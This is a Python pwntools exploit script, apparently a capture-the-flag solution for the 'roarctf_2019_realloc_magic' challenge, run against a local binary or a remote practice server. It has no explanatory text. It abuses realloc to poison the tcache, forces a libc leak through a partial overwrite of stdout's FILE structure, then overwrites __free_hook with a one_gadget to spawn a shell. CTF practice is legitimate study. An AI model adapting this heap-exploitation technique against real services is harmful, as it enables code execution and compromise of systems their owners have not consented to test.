#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./roarctf_2019_realloc_magic')
	elf = ELF('./roarctf_2019_realloc_magic',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote("node3.buuoj.cn",27678)
	elf = ELF('./roarctf_2019_realloc_magic',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)


def menu(cmd):
    sla(">> ",str(cmd))

def re(size,content):
    menu(1)
    sla("Size?\n",str(size))
    sda("Content?\n",content)

def fr():
    menu(2)

def ba():
    menu(666)


###leak libc###
re(0x80,'aaaa')
re(0,'')
re(0xa0,'bbbb')
re(0,'')
re(0xb0,'ccc')
re(0,'')

re(0xa0,'bbbb')
for i in range(7):
    fr()
re(0,'')

re(0x80,'aaaa')
payload = 'A' * 0x88 + p64(0x31) + '\x60' + '\x77' 
re(0x100,payload)
re(0,'')
re(0xa0,'aaaa')
re(0,'')
payload = p64(0xfbad1887) + p64(0) * 3 + p8(0x58)
re(0xa0,payload)
libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3e82a0
gdb.attach(p)
success(hex(libc_base))
pause()

###tcache###
one_gadget = libc_base + 0x4f322
free_hook = libc_base + libc.symbols['__free_hook']

ba()
re(0x120,'a')
re(0,'')
re(0x130,'a')
re(0,'')
re(0x170,'a')
re(0,'')
    
re(0x130,'a')
[fr() for i in range(7)]
re(0,'')

re(0x120,'a')
re(0x260,'a'*0x128+p64(0x41)+p64(free_hook))
re(0,'')
re(0x130,'a')
re(0,'')
re(0x130,p64(one_gadget))


###get shell###
fr()
ia()